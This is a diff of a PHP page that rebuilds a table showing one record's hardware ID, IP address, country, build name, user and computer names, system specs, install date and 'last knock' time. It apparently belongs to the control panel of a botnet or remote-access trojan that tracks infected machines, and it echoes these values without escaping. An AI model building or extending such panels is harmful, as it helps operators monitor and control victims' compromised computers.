@@ -94,15 +94,30 @@ $details = $details->fetch(PDO::FETCH_ASSOC);
                             <thead>
                                 <tr>
                                 <th class="mdl-data-table__cell--non-numeric">Key</th>
-                                <th width="50%">Value</th>
+                                <th class="mdl-data-table__cell--non-numeric">Value</th>
                                 </tr>
                             </thead>
                             <tbody>
                                 <?php
-                                foreach ($details as $key => $value)
-                                {
-                                    if($key !== "foundPrograms") echo "<tr><td class=\"mdl-data-table__cell--non-numeric\">".($key)."</td><td>".$value."</td></tr>";
-                                }
+                                echo '
+                                    <tr><td class="mdl-data-table__cell--non-numeric">Hardware Id</td><td class="mdl-data-table__cell--non-numeric">'.$details['hwid'].'</td></tr>
+                                    <tr><td class="mdl-data-table__cell--non-numeric">IP Address</td><td class="mdl-data-table__cell--non-numeric">'.$details['ipAddr'].'</td></tr>
+                                    <tr><td class="mdl-data-table__cell--non-numeric">Country</td><td class="mdl-data-table__cell--non-numeric">'.countryCodeToCountry($details['country']).'</td></tr>
+                                    <tr><td class="mdl-data-table__cell--non-numeric">Build Name</td><td class="mdl-data-table__cell--non-numeric">'.$details['buildName'].'</td></tr>
+                                    <tr><td class="mdl-data-table__cell--non-numeric">Build Type</td><td class="mdl-data-table__cell--non-numeric">'.$details['buildType'].'</td></tr>
+                                    <tr><td class="mdl-data-table__cell--non-numeric">User Name</td><td class="mdl-data-table__cell--non-numeric">'.$details['userName'].'</td></tr>
+                                    <tr><td class="mdl-data-table__cell--non-numeric">Computer Name</td><td class="mdl-data-table__cell--non-numeric">'.$details['computerName'].'</td></tr>
+                                    <tr><td class="mdl-data-table__cell--non-numeric">Operating System</td><td class="mdl-data-table__cell--non-numeric">'.$details['operatingSystem'].'</td></tr>
+                                    <tr><td class="mdl-data-table__cell--non-numeric">Cpu Name</td><td class="mdl-data-table__cell--non-numeric">'.$details['cpu'].'</td></tr>
+                                    <tr><td class="mdl-data-table__cell--non-numeric">Cpu Architecture</td><td class="mdl-data-table__cell--non-numeric">'.$details['cpuArchitecture'].'</td></tr>
+                                    <tr><td class="mdl-data-table__cell--non-numeric">Cpu Cores</td><td class="mdl-data-table__cell--non-numeric">'.$details['cpuCores'].'</td></tr>
+                                    <tr><td class="mdl-data-table__cell--non-numeric">Ram</td><td class="mdl-data-table__cell--non-numeric">'.$details['ram'].'Mb</td></tr>
+                                    <tr><td class="mdl-data-table__cell--non-numeric">Gpu Name</td><td class="mdl-data-table__cell--non-numeric">'.$details['gpu'].'</td></tr>
+                                    <tr><td class="mdl-data-table__cell--non-numeric">Vram</td><td class="mdl-data-table__cell--non-numeric">'.$details['vram'].'</td></tr>
+                                    <tr><td class="mdl-data-table__cell--non-numeric">Install Date</td><td class="mdl-data-table__cell--non-numeric">'.timeAgo($details['installDate']).'</td></tr>
+                                    <tr><td class="mdl-data-table__cell--non-numeric">Last Seen</td><td class="mdl-data-table__cell--non-numeric">'.timeAgo($details['lastKnock']).'</td></tr>
+                                    
+                                ';
                                 ?>
                             </tbody>
                         </table>
